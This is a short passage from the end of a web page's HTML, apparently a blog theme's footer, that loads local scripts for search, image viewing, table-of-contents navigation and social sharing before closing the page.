</script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script></body></html>